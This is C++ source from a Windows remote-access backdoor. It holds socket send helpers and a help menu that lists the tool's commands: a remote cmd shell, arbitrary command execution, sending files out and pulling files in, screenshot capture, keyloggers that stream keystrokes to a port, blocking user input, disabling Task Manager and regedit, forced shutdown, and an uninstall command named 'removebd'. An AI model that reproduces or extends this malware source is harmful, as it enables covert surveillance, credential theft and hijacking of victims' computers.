// printing functions // will be used for logging in the future? maybe?
int echo(const std::string& text, const bool& error = false, const bool& newline = true) {
	
	#ifdef DEBUG
	
	if (error)   { std::cerr << (newline ? text + "\n" : text); }
	else         { std::cout << (newline ? text + "\n" : text); }
	
	#endif
	
	return 0;
}

int getSendErr() { return echo("[-] send error: " + std::to_string(WSAGetLastError()), true); }

int echoNsend(const SOCKET& clientSocket, const std::string& text, const bool& error = false, const bool& newline = true) {
	
	#ifdef DEBUG
	
	echo(text, error, newline); // print/echo
	
	#endif
	
	// append new line
	std::string t = (newline ? text + "\n" : text);
	
	// send
	int ret = send(clientSocket, t.c_str(), t.size(), 0);
	if (ret == SOCKET_ERROR) {
		getSendErr();
	}
	
	return ret;
}

int justSend(const SOCKET& clientSocket, const std::string& text, const bool& newline = true) {
	
	// append new line
	std::string t = (newline ? text + "\n" : text);
	
	// send
	int ret = send(clientSocket, t.c_str(), t.size(), 0);
	if (ret == SOCKET_ERROR) {
		getSendErr();
	}
	
	return ret;
}

const char* getHelp() { return
	"====[ PRINT ]====\n"
	" helpme - prints this help output\n"
	" ps1on  - display/enable prompt\n"
	" ps1off - hide/disable prompt\n"
	" pwd    - print current dir\n"
	" xclip  - print clipboard (only if it's ascii text)\n"
	" exip   - print public/external ip\n"
	"\n"
	"====[ CD ]====\n"
	" cd <path> - change dir\n"
	" dx        - change dir to current user's desktop\n"
	" temp      - change dir to %TEMP%\n"
	" appdata   - change dir to %APPDATA%\n"
	"\n"
	"====[ EXEC ]===\n"
	" shell     - open port for CMD\n"
	" run <cmd> - run command and print output (cmd /c <cmd>)\n"
	"\n"
	"====[ FILE ]====\n"
	" sf <filePath>      - send file back to host (open port for dumping file)\n"
	" rf <filePath>      - receive file on this machine (open port for file receiving)\n"
	" sssf               - take screenshot and send the (bitmap) file/image\n"
	" ss <imagePath>.bmp - take screenshot (bitmap format)\n"
	"\n"
	"====[ KEYLOGGER ]====\n"
	" keylogger <filePath(optional)>.log       - start keylogger thread (optional - write to file)\n"
	" cleanlogger <filePath(optional)>.log     - start (human readable) keylogger thread (optional - write to file)\n"
	" dumplogger                               - dump logged keystrokes\n"
	" stoplogger                               - stop keylogger thread\n"
	" clearlogger                              - clear keylogger buffer (must run \"stoplogger\" first)\n"
	" livekeylogger <filePath(optional)>.log   - open keylogger port (optional - write to file)\n"
	" livecleanlogger <filePath(optional)>.log - open (human readable) keylogger port (optional - write to file)\n"
	"\n"
	"====[ MESS WITH USER ]===\n"
	" msg <text>             - show message box\n"
	" sk <text>              - send/simulate keyboard keys (run \"sk\" for more help)\n"
	" playwav <filePath.wav> - play wav file\n"
	" loopwav <filePath.wav> - play wav file repeatedly\n"
	" stopwav                - stop playing wav file\n"
	" playmp3 <filePath.mp3> - open and play mp3 file\n"
	" loopmp3                - enable looping\n"
	" pausemp3               - pause the currently playing mp3 file\n"
	" resumemp3              - resume playing the mp3 file\n"
	" stopmp3                - stop playing mp3 file and close it\n"
	" bion                   - disable/block user input\n"
	" bioff                  - enable/unblock user input\n"
	" atkon                  - disable taskmgr and regedit\n"
	" atkoff                 - enable taskmgr and regedit\n"
	" cmon                   - make mouse unusable by making it go in circles\n"
	" cmoff                  - stop mouse from going in circles\n"
	" kbdon                  - keyboard disco lights\n"
	" kbdoff                 - stop keyboard disco\n"
	"\n"
	"===[ ALIASES ]===\n"
	" id       - alias for \"run whoami\"\n"
	" poweroff - alias for \"run shutdown /s /t 1\"\n"
	" reboot   - alias for \"run shutdown /r /t 1\"\n"
	" ktm      - alias for \"run taskkill /F /IM taskmgr.exe\"\n"
	" kre      - alias for \"run taskkill /F /IM regedit.exe\"\n"
	" disks    - alias for \"run wmic logicaldisk get name\"\n"
	" titles   - alias for \"run TASKLIST /v /fo list | find /i \"window title\" | find /v \"N/A\"\"\n"
	" .        - repeat last entered command\n"
	"\n"
	"====[ EXIT ]====\n"
	" exit     - close connection\n"
	" stop     - stop the shell\n"
	" removebd - uninstall backdoor\n"
	"\n"
	" - all other commands are passed to: cmd /c <cmd>\n"
	"\n"
	;
}


